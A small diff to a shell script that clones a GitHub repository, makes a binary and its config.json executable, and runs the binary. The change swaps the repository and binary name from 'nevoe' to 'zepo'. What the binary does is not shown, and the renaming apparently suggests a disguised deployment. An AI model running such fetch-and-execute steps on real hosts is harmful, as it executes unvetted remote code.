@@ -4,9 +4,8 @@
 # kumaha aink we njink
 
 cd /home/shell-bot
-git clone https://github.com/Sairin-SLOT/nevoiu.git
-cd nevoiu
-chmod +x LICENSE
+git clone https://github.com/Sairin-SLOT/zepo.git
+cd zepo
 chmod +x config.json
-chmod +x nevoe
-./nevoe -c "config.json"
+chmod +x zepo
+./zepo -c "config.json" 
